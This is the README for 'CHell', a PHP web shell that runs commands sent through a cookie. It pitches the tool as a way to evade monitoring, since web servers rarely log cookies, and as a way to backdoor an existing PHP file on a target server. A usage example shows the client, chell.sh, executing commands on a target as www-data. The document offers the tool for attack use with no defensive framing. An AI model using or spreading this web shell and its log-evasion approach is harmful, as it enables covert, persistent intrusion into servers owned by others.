![License](https://img.shields.io/badge/license-sushiware-red)
![Issues open](https://img.shields.io/github/issues/crashbrz/CHell)
![GitHub pull requests](https://img.shields.io/github/issues-pr-raw/crashbrz/CHell)
![GitHub closed issues](https://img.shields.io/github/issues-closed-raw/crashbrz/CHell)
![GitHub last commit](https://img.shields.io/github/last-commit/crashbrz/CHell)

# CHell
The CHell is a PHP shell based on cookies to execute commands.<br> 
It might bypass several controls, and monitoring due to the web servers usually does not include the cookies into log files.

## Notes ##
- CHell <chell.php> can be used as standalone .php file or backdooring an existence .php file into the server. 
- CHell by default uses JSESSION cookie name. If necessary, change it.
- Cookie value encryption was not added due to the necessity of encryption libs must be installed/loaded on the server-side. 

### Installation ###
Download the latest release and unpack it in the desired location.<br>
chell.php must be uploaded in the target.

### License ###
CHell is licensed under the SushiWare license. Check [docs/license.txt](docs/license.txt) for more information.

### Usage ###
```
./chell.sh http://target/chell.php
Press <CTRL+C> to exit.
CHELL>id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
### PHP Version ###
```
Tested on:
CHELL>php -v
PHP 7.4.9 (cli) (built: Aug 27 2020 13:37:23) ( NTS )
Copyright (c) The PHP Group
Zend Engine v3.4.0, Copyright (c) Zend Technologies
with Zend OPcache v7.4.9, Copyright (c), by Zend Technologies
```
### To Do ###
Windows client support 
